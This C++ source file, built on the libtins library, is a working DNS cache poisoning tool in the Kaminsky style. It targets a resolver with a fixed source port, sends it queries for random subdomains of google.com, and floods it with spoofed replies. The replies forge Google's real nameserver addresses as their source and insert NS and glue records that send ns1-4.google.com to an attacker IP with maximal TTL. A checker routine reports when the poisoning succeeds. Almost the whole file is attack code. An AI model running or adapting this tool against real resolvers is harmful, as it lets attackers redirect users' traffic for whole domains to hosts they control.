#include <random>
#include <tins/tins.h>

using namespace Tins;

std::random_device rd;								 //
std::mt19937 rng(rd());								 // supersonic mersenne engine
std::uniform_int_distribution<int> uni(1025, 65000); //


// We should know attackers IP (No I dont want to use system ip that runs this code directly)
std::string attackersip = "4.3.2.1";
// Attacker should set up smt to welcome victim
std::string targetip = "192.168.0.130";
// Vulnerable DNS Server
std::string targetdns = "192.168.0.129";
// Authoritative upper level one
//std::string authoritativedns = "208.109.255.50";
std::string authoritativedns = "216.239.32.10";
std::string authoritativedns2 = "216.239.34.10";
std::string authoritativedns3 = "216.239.36.10";
std::string authoritativedns4 = "216.239.38.10";
// sarcastic section of the subdomain
std::string sarcastic = "";
// base domain for generating sarcastic subdomains
std::string basedomain = "google.com";
// domain which will be conquered for tricking user
std::string claimeddomain = "www.google.com";
// Authoritative upper level one
std::string spoofeddns = "ns1.google.com";
std::string spoofeddns2 = "ns2.google.com";
std::string spoofeddns3 = "ns3.google.com";
std::string spoofeddns4 = "ns4.google.com";
// port that is static in vulnerable dns
uint32_t attackport = 55555;

// TXID or iow QID
uint32_t curr_id = 1024;


std::string rand_str(int len)
{
   srand(time(0));
   std::string str = "0123456789abcdefghijklmnopqrstuvwxyz";
   int pos;
   while(str.size() != len) {
    pos = ((rand() % (str.size() - 1)));
    str.erase (pos, 1);
   }
   return str;
}

bool send_tricky_request(std::string target_dns, std::string sarcasm, std::string base) 
{
	PacketSender sender;

	sarcastic.clear();
	sarcasm.clear();
	sarcasm.append("vrtx");
	sarcasm.append(rand_str(5));
	sarcasm.append(".");
	sarcasm.append(base);


	uint16_t true16 = 0x1;
	uint16_t false16 = 0x0;
	uint8_t true8 = 0x1;
	uint8_t false8 = 0x0;

	auto random_port = uni(rng);
	IP req_pkt = IP(target_dns) / UDP(53, random_port) / DNS();

	req_pkt.rfind_pdu<DNS>().id(99);
	req_pkt.rfind_pdu<DNS>().opcode(0x00);
	req_pkt.rfind_pdu<DNS>().type(DNS::QUERY);
	req_pkt.rfind_pdu<DNS>().recursion_desired(1);
	req_pkt.rfind_pdu<DNS>().recursion_available(0);
	// req_pkt.rfind_pdu<DNS>().questions_count(true16);
	// req_pkt.rfind_pdu<DNS>().answers_count(false16);
	// req_pkt.rfind_pdu<DNS>().authority_count(false16);
	// req_pkt.rfind_pdu<DNS>().additional_count(false16);

	req_pkt.rfind_pdu<DNS>().add_query( { sarcasm, DNS::A, DNS::IN } );

	sarcastic = sarcasm;
	std::cout << "Sending dummy request for " << sarcasm << " with port " << random_port << std::endl; 

    sender.send(req_pkt);

    return true;
}

bool build_believable_responses(std::string sarcasm, std::string author_dns, std::string target_dns, std::string spoof_dns, std::string claim_domain, uint32_t port){
	PacketSender sender;
	uint32_t ttl_val = 4294967295;

	for (int i = 0; i < 50; ++i)
	{
		IP resp_pkt = IP(target_dns, authoritativedns) / UDP(port, 53) / DNS();

		resp_pkt.rfind_pdu<DNS>().id(curr_id);

		curr_id += 1;
		if (curr_id == 65536)
			curr_id = 1024;

		resp_pkt.rfind_pdu<DNS>().type(DNS::RESPONSE);
		resp_pkt.rfind_pdu<DNS>().authoritative_answer(1);
		resp_pkt.rfind_pdu<DNS>().recursion_desired(1);
		resp_pkt.rfind_pdu<DNS>().recursion_available(1);

		resp_pkt.rfind_pdu<DNS>().add_query( { sarcasm, DNS::A, DNS::IN } );

		// build answers record field
		DNS::Resource resp_field;
		resp_field.dname(sarcasm);
		resp_field.ttl(ttl_val);
		resp_field.type(DNS::A);
		resp_field.query_class(DNS::IN);
		resp_field.data(targetip);

		resp_pkt.rfind_pdu<DNS>().add_answer( resp_field );


		//build authoritative record field

		DNS::Resource authority_field;
		authority_field.dname(sarcasm);
		authority_field.ttl(ttl_val);
		authority_field.type(DNS::NS);
		authority_field.query_class(DNS::IN);
		authority_field.data(spoofeddns);

		resp_pkt.rfind_pdu<DNS>().add_authority( authority_field );


		// Additional field
		DNS::Resource faker_field;
		faker_field.dname(spoofeddns);
		faker_field.ttl(ttl_val);
		faker_field.type(DNS::A);
		faker_field.query_class(DNS::IN);
		faker_field.data(attackersip);

		resp_pkt.rfind_pdu<DNS>().add_additional( faker_field );

		std::cout << "Bulk believable request from " << author_dns << " with QID => " << curr_id << " for " << sarcasm << std::endl;

		sender.send(resp_pkt);

//////////////////////////////////////////////////////////


		resp_pkt = IP(target_dns, authoritativedns2) / UDP(port, 53) / DNS();

		resp_pkt.rfind_pdu<DNS>().id(curr_id);

		resp_pkt.rfind_pdu<DNS>().type(DNS::RESPONSE);
		resp_pkt.rfind_pdu<DNS>().authoritative_answer(1);
		resp_pkt.rfind_pdu<DNS>().recursion_desired(1);
		resp_pkt.rfind_pdu<DNS>().recursion_available(1);

		resp_pkt.rfind_pdu<DNS>().add_query( { sarcasm, DNS::A, DNS::IN } );

		// build answers record field

		resp_field.dname(sarcasm);
		resp_field.ttl(ttl_val);
		resp_field.type(DNS::A);
		resp_field.query_class(DNS::IN);
		resp_field.data(targetip);

		resp_pkt.rfind_pdu<DNS>().add_answer( resp_field );


		//build authoritative record field

		authority_field.dname(sarcasm);
		authority_field.ttl(ttl_val);
		authority_field.type(DNS::NS);
		authority_field.query_class(DNS::IN);
		authority_field.data(spoofeddns2);

		resp_pkt.rfind_pdu<DNS>().add_authority( authority_field );


		// Additional field

		faker_field.dname(spoofeddns2);
		faker_field.ttl(ttl_val);
		faker_field.type(DNS::A);
		faker_field.query_class(DNS::IN);
		faker_field.data(attackersip);

		resp_pkt.rfind_pdu<DNS>().add_additional( faker_field );

		std::cout << "Bulk believable request from " << author_dns << " with QID => " << curr_id << " for " << sarcasm << std::endl;

		sender.send(resp_pkt);


//////////////////////////////////////////////////////////


		resp_pkt = IP(target_dns, authoritativedns3) / UDP(port, 53) / DNS();

		resp_pkt.rfind_pdu<DNS>().id(curr_id);

		resp_pkt.rfind_pdu<DNS>().type(DNS::RESPONSE);
		resp_pkt.rfind_pdu<DNS>().authoritative_answer(1);
		resp_pkt.rfind_pdu<DNS>().recursion_desired(1);
		resp_pkt.rfind_pdu<DNS>().recursion_available(1);

		resp_pkt.rfind_pdu<DNS>().add_query( { sarcasm, DNS::A, DNS::IN } );

		// build answers record field
		resp_field.dname(sarcasm);
		resp_field.ttl(ttl_val);
		resp_field.type(DNS::A);
		resp_field.query_class(DNS::IN);
		resp_field.data(targetip);

		resp_pkt.rfind_pdu<DNS>().add_answer( resp_field );


		//build authoritative record field

		authority_field.dname(sarcasm);
		authority_field.ttl(ttl_val);
		authority_field.type(DNS::NS);
		authority_field.query_class(DNS::IN);
		authority_field.data(spoofeddns3);

		resp_pkt.rfind_pdu<DNS>().add_authority( authority_field );


		// Additional field

		faker_field.dname(spoofeddns3);
		faker_field.ttl(ttl_val);
		faker_field.type(DNS::A);
		faker_field.query_class(DNS::IN);
		faker_field.data(attackersip);

		resp_pkt.rfind_pdu<DNS>().add_additional( faker_field );

		std::cout << "Bulk believable request from " << author_dns << " with QID => " << curr_id << " for " << sarcasm << std::endl;

		sender.send(resp_pkt);


//////////////////////////////////////////////////////////


		resp_pkt = IP(target_dns, authoritativedns4) / UDP(port, 53) / DNS();

		resp_pkt.rfind_pdu<DNS>().id(curr_id);

		resp_pkt.rfind_pdu<DNS>().type(DNS::RESPONSE);
		resp_pkt.rfind_pdu<DNS>().authoritative_answer(1);
		resp_pkt.rfind_pdu<DNS>().recursion_desired(1);
		resp_pkt.rfind_pdu<DNS>().recursion_available(1);

		resp_pkt.rfind_pdu<DNS>().add_query( { sarcasm, DNS::A, DNS::IN } );

		// build answers record field

		resp_field.dname(sarcasm);
		resp_field.ttl(ttl_val);
		resp_field.type(DNS::A);
		resp_field.query_class(DNS::IN);
		resp_field.data(targetip);

		resp_pkt.rfind_pdu<DNS>().add_answer( resp_field );


		//build authoritative record field


		authority_field.dname(sarcasm);
		authority_field.ttl(ttl_val);
		authority_field.type(DNS::NS);
		authority_field.query_class(DNS::IN);
		authority_field.data(spoofeddns4);

		resp_pkt.rfind_pdu<DNS>().add_authority( authority_field );


		// Additional field

		faker_field.dname(spoofeddns4);
		faker_field.ttl(ttl_val);
		faker_field.type(DNS::A);
		faker_field.query_class(DNS::IN);
		faker_field.data(attackersip);

		resp_pkt.rfind_pdu<DNS>().add_additional( faker_field );

		std::cout << "Bulk believable request from " << authoritativedns4 << " with QID => " << curr_id << " for " << sarcasm << std::endl;

		sender.send(resp_pkt);

	}

	return true;
}

bool checker_request(std::string target_dns, std::string sarcasm, std::string base, std::string target_ip) 
{
	PacketSender sender;

	sarcasm.clear();
	sarcasm.append("vrtx");
	sarcasm.append(rand_str(5));
	sarcasm.append(".");
	sarcasm.append(base);


	uint16_t true16 = 0x1;
	uint16_t false16 = 0x0;
	uint8_t true8 = 0x1;
	uint8_t false8 = 0x0;

	auto random_port = uni(rng);
	IP req_pkt = IP(target_dns) / UDP(53, random_port) / DNS();

	req_pkt.rfind_pdu<DNS>().id(99);
	req_pkt.rfind_pdu<DNS>().opcode(0x00);
	req_pkt.rfind_pdu<DNS>().type(DNS::QUERY);
	req_pkt.rfind_pdu<DNS>().recursion_desired(1);
	req_pkt.rfind_pdu<DNS>().recursion_available(0);
	// req_pkt.rfind_pdu<DNS>().questions_count(true16);
	// req_pkt.rfind_pdu<DNS>().answers_count(false16);
	// req_pkt.rfind_pdu<DNS>().authority_count(false16);
	// req_pkt.rfind_pdu<DNS>().additional_count(false16);

	req_pkt.rfind_pdu<DNS>().add_query( { sarcasm, DNS::A, DNS::IN } );

	std::cout << "Sending checker request for " << sarcasm << " with port " << random_port << std::endl; 

	std::unique_ptr<PDU> response(sender.send_recv(req_pkt));

	try {
		if(response) {
		    // Interpret the response
		    DNS dns = response->rfind_pdu<RawPDU>().to<DNS>();
		    // Print responses
		    for(const auto &record : dns.answers()) {
		        std::cout << record.dname() << " - " << record.data() << std::endl;
		    	if(record.data().compare(target_ip) == 0) {
		    		std::cout << "POISONED - EXITING..." << std::endl;
		    		exit(EXIT_SUCCESS);
		    	} else {
		    		std::cout << "Poisoning failed. Continuing..." << std::endl;
		    	}
		    }
		}
	}catch( ... )
	{
		std::cout << "Destination Unreachable // Port unreachable" << std::endl;
	}

    return true;
}

int main() {
	PacketSender sender;

	while(0xFADE) {
		send_tricky_request(targetdns, sarcastic, basedomain);
		build_believable_responses(sarcastic, authoritativedns, targetdns, spoofeddns, claimeddomain, attackport);
		//checker_request(targetdns, sarcastic, basedomain, targetip);
	}

	return 0;
}
